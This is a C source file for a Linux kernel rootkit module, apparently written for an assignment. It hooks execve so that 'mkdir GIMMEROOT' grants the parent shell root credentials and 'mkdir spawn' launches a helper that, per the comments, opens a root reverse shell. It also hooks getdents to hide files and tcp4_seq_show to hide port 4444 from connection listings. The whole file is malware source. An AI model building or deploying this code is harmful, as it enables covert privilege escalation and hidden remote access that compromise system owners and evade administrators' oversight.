#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>

#include <linux/binfmts.h>
#include <linux/uidgid.h>
#include <linux/cred.h>

#include <linux/inet_diag.h>	/* Needed for ntohs */
#include <net/tcp.h>			/* Needed for struct tcp_seq_afinfo */
#include <net/udp.h>			/* Needed for struct udp_seq_afinfo */


#include "helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fafnirZ");


char char_buffer[255] = {0};
// Note: Do not name variables similar, especially globals.
// The argc <-> argz <-> argv differ only in one char.
// and 2d array to hold arguments strings
char argz[255][255] = {0};
// the count of arguments
size_t argc = 0;


char CharBuffer [255] = {'\0'};
char Argz       [255] = {'\0'};


////////////////////////////////////////////
//				hooking execve			  //
////////////////////////////////////////////

asmlinkage int (*origional_execve)(const char *filename, char *const argv[], char *const envp[]);


//this hook hooks Execve syscall and compares the syscall arguments with a predetermined command
//if the command matches it'll hook it and call userland helper script
//my case this is a bash script which spawns a reverse shell
//call_usermodehelper function runs the script with root privilleges 
//i.e. the reverse shell also has root privilleges
asmlinkage int HookExecve(const char *filename, char *const argv[], char *const envp[]) {

	copy_from_user(&CharBuffer , filename , strnlen_user(filename , sizeof(CharBuffer) - 1  ) );
	  //printk( KERN_INFO "Executable Name %s  \n", CharBuffer );

	char * ptr = 0xF00D; 

	  // Since we don't know the count of args we go until the 0 arg.
	  // We will collect 20 args maximum. 

	for (int i = 0 ; i < 20 ; i++){ 
		if(ptr){
			 int success =  copy_from_user(&ptr, &argv[i], sizeof(ptr));
			 // Check for ptr being 0x00 
			 if(success == 0 && ptr){
				//printk( KERN_INFO "Pointer Name %px  \n", ptr );
				strncpy_from_user(Argz, ptr , sizeof(Argz));
				//save to 2d array of commands
				strncpy_from_user(argz[i], ptr, sizeof(Argz));
				//printk( KERN_INFO "Args  %s  \n", argz[i] );
				memset(Argz, 0 ,sizeof(Argz));

			 }
		}
	}
	//look at the 2d array for the arguments 
	//assumption the command will be mkdir something_pid
	// i.e. only 2 arguments

	if (strcmp(argz[0], "mkdir") == 0) { 
        if (strcmp(argz[1], "GIMMEROOT") == 0) {
            get_root();
        }

    
		if (strcmp(argz[1], "spawn") == 0) {
			printk(KERN_INFO "THIS IS RIGHT\n");
			char *argv[] = { "/home/fafnir/rootkit/src/spawnandhide/spawn" , NULL };
			//call userland helper function i.e. a script that spawns a reverse shell
			int YAY = call_usermodehelper(argv[0], argv , NULL, UMH_NO_WAIT);


		}
	}

	return (*origional_execve)(filename, argv, envp);
}


void get_root(void) {

    struct task_struct *t, *prev;
    t = get_current();
    printk(KERN_NOTICE "assignment: current process: %s, PID: %d", t->comm, t->pid);
    do {
        // do something with t
        prev = t;
        t = t->parent;
        if ( strcmp(t->comm, "bash") == 0) {
            printk(KERN_NOTICE "assignment: current parent process: %s, PID: %d", t->comm, t->pid);
            //create new credentials
            printk(KERN_NOTICE "UID before change is: %d\n", t->cred->uid);
            
            //creating new credentials with root priv
            struct cred *new_cred;
            kuid_t kuid = KUIDT_INIT(0);
            kgid_t kgid = KGIDT_INIT(0);
            new_cred = prepare_creds();
       
            new_cred->uid = kuid;
            new_cred->gid = kgid;
            new_cred->euid = kuid;
            new_cred->egid = kgid;
            t->cred = new_cred;

            printk(KERN_NOTICE "UID after change is: %d\n", t->cred->uid);



        }
    } while (prev->pid != 0); 


}

////////////////////////////////////////////
//				hooking getdents		  //
////////////////////////////////////////////


asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

asmlinkage int hookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {

	struct linux_dirent *retn, *dirp3;
	int Records, RemainingBytes, length;

	//records is the length of bytes returned 
	//end of dir -> ret 0
	//err -> ret -1
	Records = (*original_getdents)(fd, dirp, count);
	
	if (Records < 1 ) {
		return Records;	
	}

	retn = (struct linux_dirent*) kmalloc(Records, GFP_KERNEL);	
	
	// @1 to
	// @2 from
	// @3 number of bytes
	copy_from_user(retn, dirp, Records);

    //dirp3 is the iterator
    dirp3 = retn;
    RemainingBytes = Records;

    while(RemainingBytes > 0) {
        length = dirp3->d_reclen;
        //minus length from remaining bytes
        RemainingBytes = RemainingBytes - length;
         
        //printk(KERN_INFO "RemainingBytes: %d\t File: %s\n", RemainingBytes, dirp3->d_name);
        if (strcmp(dirp3->d_name, hide) == 0) {
            
            //copy all following inodes
            //@1 dest
            //@2 src
            //@3 size_t
            //starting from pointer after current pointer
            memcpy(dirp3, (char *)dirp3+dirp3->d_reclen, RemainingBytes);
            Records -= length; //  dirp3->d_reclen leads to mistake? because dirp3 is updated

        }


        //next
        dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);
        
    }

    copy_to_user(dirp, retn, Records);
    kfree(retn);
    //original amount of bytes
    return Records; 

}

////////////////////////////////////////////////////
//				hooking tcp4_seq_show			  //
////////////////////////////////////////////////////



static asmlinkage long(*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

//this is not a syscall hook and the logic behind hooking it
//will not be using cr0 and editing the sys_call_table
//will be hooked using kallsyms_get_name to get address of tcp4_seq_show
//then using ftrace to edit it
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {
    
    struct sock *sk = v;
    //if it doesnt point to anything it'll point to 0x1
    if(sk != (struct sock *)0x1 && sk->sk_num == 0x115c) {
        printk(KERN_INFO "port 4444 was hooked\n");
        return 0;
    }
    else {
        printk(KERN_DEBUG "here\n");
    }


    return orig_tcp4_seq_show(seq, v);
}


/////////////////////////////////////////////////
//    		hook for tcp4_seq_show             //
/////////////////////////////////////////////////

struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),   
};





static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);


	EnablePageWriting();


  	//Replaces Pointer Of Syscall_getdents on our syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)hookGetDents;	

	//replaces execve
	origional_execve = (void*)SYS_CALL_TABLE[__NR_execve];
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)HookExecve;
	
	DisablePageWriting();
	
	//installing ftrace hooks
	int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err) return err;


	return 0;
}



static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	SYS_CALL_TABLE[__NR_execve] = (unsigned long*)origional_execve;
	DisablePageWriting();
    
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

	printk(KERN_INFO "HooksCleaned Up!");
}



module_init(SetHooks);
module_exit(HookCleanup);
